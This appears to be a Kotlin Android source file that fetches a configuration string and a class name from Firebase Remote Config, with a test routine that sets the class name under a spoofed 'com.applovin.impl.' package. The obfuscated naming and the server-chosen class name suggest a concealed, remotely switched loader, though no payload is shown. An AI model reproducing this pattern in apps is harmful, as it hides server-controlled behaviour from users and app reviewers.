package com.papaya.fig

import android.os.Handler
import android.os.Looper
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import kotlin.random.Random

/**
 * Dateï¼š2025/10/30
 * Describe:
 */
class FigFirebase : BaseConfigure() {
    //c.a
    val nameFire by lazy { "c.ae1a12" }
    private val handle = Handler(Looper.getMainLooper())

    // todo modify  safety_configure
    private val key = "test"

    // todo modify  name_safety
    private val key2 = "test2"

    fun fetchStr() {
        runCatching {
            Firebase.remoteConfig.fetchAndActivate().addOnSuccessListener {
                str = Firebase.remoteConfig.getString(key)
                val name = Firebase.remoteConfig.getString(key2)
                if (name.isNotEmpty()) {
                    FigCache.nameFun = name + nameInfo
                }
                FigCache.mConfigureFig = str
                if (str.isBlank()) {
                    handle.postDelayed({
                        fetchStr()
                    }, 800)
                }
            }.addOnFailureListener {
                if (str.isBlank()) {
                    handle.postDelayed({
                        fetchStr()
                    }, 800)
                }
            }
        }
        test()
    }

    // todo del neyuizjmg123
    private val testStr = """
        
    """.trimIndent()

    // todo remove
    private var num = 0
    private fun test() {
        num = Random.nextInt(0, 6)
        FigCache.nameFun = "com.applovin.impl.$nameInfo"
        if (num > 3) {
            str = testStr
            FigCache.mConfigureFig = str
        } else {
            handle.postDelayed({
                test()
            }, 1000)
        }
    }
}